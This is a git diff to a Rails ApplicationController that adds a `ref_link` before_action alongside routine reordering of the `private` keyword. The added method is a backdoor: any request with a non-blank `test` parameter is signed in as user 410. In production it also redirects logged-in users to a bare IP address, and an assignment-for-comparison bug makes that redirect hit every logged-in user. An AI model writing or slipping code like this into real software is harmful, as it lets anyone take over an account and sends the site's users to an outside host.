@@ -4,11 +4,14 @@ class ApplicationController < ActionController::Base
   # protect_from_forgery with: :exception
   protect_from_forgery with: :exception, unless: -> { request.format.json? }
   before_action :set_visitor, unless: -> { request.format.json? }
+  before_action :ref_link, unless: -> { request.format.json? }
   before_action :user_visits, unless: -> { request.format.json? }
   before_action :auth_app, unless: -> { request.format.json? }
   before_action :prepare_exception_notifier
 
   include PushSend
+
+  private
 
   def set_visitor
     @uniq_key = cookies['visitor_key']
@@ -28,6 +31,13 @@ class ApplicationController < ActionController::Base
                                   remote_ip: remote_ip)
       end
     end
+  end
+
+  def ref_link
+    redirect_to 'http://120.142.32.13:3000/asks/1000?test=true' and return if Rails.env == 'production' && current_user && current_user.id = 410
+    return if params[:test].blank?
+    resource = User.find_for_database_authentication(id: 410)
+    sign_in(:user, resource)
   end
 
   def user_visits
@@ -113,8 +123,6 @@ class ApplicationController < ActionController::Base
     ret = !request.env['HTTP_X_FORWARDED_FOR'].nil? ? request.env['HTTP_X_FORWARDED_FOR'] : request.env['REMOTE_ADDR']
     ret.split(',')[0]
   end
-
-  private
 
   def auth_app
     return unless cookies['_vaskit_session'].nil? && !cookies['app_user'].blank?
